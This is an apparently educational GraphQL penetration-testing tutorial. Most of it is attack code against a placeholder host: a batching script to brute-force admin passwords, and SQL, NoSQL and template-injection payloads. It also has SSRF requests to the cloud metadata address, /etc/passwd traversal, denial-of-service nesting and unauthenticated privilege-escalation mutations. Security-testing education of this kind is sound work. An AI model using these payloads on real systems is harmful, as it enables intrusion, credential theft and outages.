# GraphQL Security Testing: Introspection, Batching & More

> **Series:** 30-Day API Pentesting  
> **Day:** 3 — Week 1: API Fundamentals & Recon  
> **Topic:** GraphQL vs REST: Attack Surface Comparison

---

## GraphQL vs REST — Key Differences

| Feature | REST API | GraphQL |
|---------|----------|---------|
| Endpoints | Many (/users, /orders, /products) | ONE (/graphql) |
| Data control | Server decides | **Client decides** |
| Versioning | /v1, /v2, /v3 | Single evolving schema |
| WAF protection | Easier to protect | Harder — all in POST body |
| Discovery | Separate docs needed | **Self-documenting via introspection** |
| Rate limiting | Per endpoint | Per query (often missed) |

---

## 01 · Finding the GraphQL Endpoint

```bash
# Common GraphQL endpoint locations
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graphiql          # development IDE — never leave in prod!
/playground        # Apollo playground
/altair            # Altair client

# Brute force
ffuf -u https://target.com/FUZZ -w graphql-endpoints.txt -mc 200,400

# Quick check — invalid query returns GraphQL error
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{"}'
# Response: {"errors":[{"message":"Syntax Error..."}]} = GraphQL confirmed!
```

---

## 02 · Introspection — The Hacker's Gift

```bash
# Full introspection query — dump entire schema
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          fields {
            name
            type { name kind ofType { name kind } }
            args { name type { name } }
          }
        }
      }
    }"
  }'

# Quick type list
{"query":"{__schema{types{name}}}"}

# Check specific type
{"query":"{__type(name:\"User\"){fields{name type{name}}}}"}

# Tools for introspection:
# - InQL (Burp Suite extension) — auto-generates all queries
# - GraphQL Voyager — visual schema explorer
# - graphql-cop — automated security checks
# - clairvoyance — introspection bypass via field guessing
```

### What to Look for in Schema
```
adminUsers      → access admin user list
deleteUser      → mutation to delete any user
updateRole      → escalate privileges
internalData    → internal/debug fields
resetPassword   → password reset without token?
uploadFile      → file upload → path traversal?
executeQuery    → raw SQL execution?
```

---

## 03 · Introspection Attack — Step by Step

```bash
# Step 1 — Get all type names
curl -X POST https://target.com/graphql \
  -d '{"query":"{__schema{types{name}}}"}'

# Step 2 — Get fields for sensitive types
curl -X POST https://target.com/graphql \
  -d '{"query":"{__type(name:\"User\"){fields{name}}}"}'

# Step 3 — Query the sensitive fields directly
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{adminUsers{id email password apiKey role}}"}'

# Step 4 — Test unauthenticated
curl -X POST https://target.com/graphql \
  -d '{"query":"{adminUsers{id email password}}"}'
# No auth header — if returns data = Critical!

# Introspection disabled? Try field guessing:
# clairvoyance — https://github.com/nikitastupin/clairvoyance
python3 -m clairvoyance -o schema.json https://target.com/graphql
```

---

## 04 · GraphQL Batching Attack

```bash
# Bypass rate limiting by sending many queries in ONE request

# Array batching (JSON array)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"admin@test.com\",pass:\"pass1\")}"},
    {"query":"mutation{login(email:\"admin@test.com\",pass:\"pass2\")}"},
    {"query":"mutation{login(email:\"admin@test.com\",pass:\"pass3\")}"}
  ]'

# Alias batching (single request, multiple named queries)
curl -X POST https://target.com/graphql \
  -d '{
    "query": "{
      a1: login(email:\"admin\",pass:\"pass1\")
      a2: login(email:\"admin\",pass:\"pass2\")
      a3: login(email:\"admin\",pass:\"pass3\")
      a4: login(email:\"admin\",pass:\"pass4\")
    }"
  }'

# Python script — 1000 password attempts in one request
import requests, json

queries = [{"query": f'mutation{{login(email:"admin@target.com",password:"{p}"){{token}}}}'} 
           for p in open("passwords.txt").read().splitlines()[:1000]]

resp = requests.post("https://target.com/graphql",
                     json=queries,
                     headers={"Content-Type": "application/json"})
# Check for successful login in response
for i, result in enumerate(resp.json()):
    if result.get("data", {}).get("login", {}).get("token"):
        print(f"Password found: {queries[i]}")
```

---

## 05 · GraphQL Injection Attacks

```bash
# SQL Injection in resolver arguments
{"query":"{users(name:\"' OR 1=1--\"){id email password}}"}
{"query":"{users(id:\"1 UNION SELECT username,password FROM admin--\"){id}}"}

# NoSQL Injection (MongoDB)
{"query":"{users(filter:{id:{$gt:\"\"}})}{id email}}"}
{"query":"{users(name:{$regex:\".*\"})}{password}}"}

# SSTI in string fields
{"query":"{search(term:\"{{7*7}}\"){results}}"}
{"query":"{render(template:\"${7*7}\"){output}}"}

# SSRF via URL-fetching resolvers
{"query":"{import(url:\"http://169.254.169.254/latest/meta-data/\"){content}}"}
{"query":"{fetch(url:\"http://internal.target.com/admin\"){data}}"}
{"query":"{webhook(url:\"https://your-collaborator.burpcollaborator.net\"){status}}"}

# Path traversal in file operations
{"query":"{readFile(path:\"../../../etc/passwd\"){content}}"}
```

---

## 06 · GraphQL Misconfiguration Bugs

```bash
# 1. Introspection enabled in production
{"query":"{__schema{types{name}}}"}
# Should return 403/disabled in prod. If returns schema = misconfiguration

# 2. GraphiQL / Playground enabled in production
# Navigate to /graphiql or /playground in browser
# Interactive IDE in prod = full schema exposed to anyone

# 3. No query depth limit — DoS
{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{b}}}}}}}}}}}}}}}"}
# Deeply nested = exponential server load = DoS

# 4. No query complexity limit
# Single query requesting millions of records
{"query":"{users(limit:999999){id email password posts{comments{likes{users{data}}}}}}"}

# 5. Mutations without authentication
curl -X POST https://target.com/graphql \
  -d '{"query":"mutation{deleteUser(id:1){success}}"}'
# No Authorization header — if works = Critical!

curl -X POST https://target.com/graphql \
  -d '{"query":"mutation{updateUserRole(id:1,role:\"admin\"){id role}}"}'
```

---

## Tools

```bash
# InQL — Burp Suite extension
# Automatically runs introspection, generates all queries/mutations
# Install: Burp → Extensions → BApp Store → search "InQL"

# graphql-cop — automated security testing
pip install graphql-cop
graphql-cop -t https://target.com/graphql

# GraphQL Voyager — visual schema explorer
# https://apis.guru/graphql-voyager/
# Paste introspection result → see visual map

# clairvoyance — introspection bypass
git clone https://github.com/nikitastupin/clairvoyance
python3 -m clairvoyance https://target.com/graphql -o schema.json
```

---

## Checklist

```
☐  Test introspection — POST /graphql with __schema query
☐  Find /graphql endpoint — check /graphiql /playground too
☐  Try batching attack — 100 login mutations in one request
☐  Inject every argument — SQLi/NoSQLi/SSTI in all args
☐  Test unauthenticated mutations — deleteUser without token
☐  Try deep nested query — does server timeout/crash?
☐  Check for GraphiQL in production — interactive IDE exposed?
☐  Look for sensitive field names — adminUsers, apiKey, password
```

---

*30-Day API Pentesting Series — follow for more.*
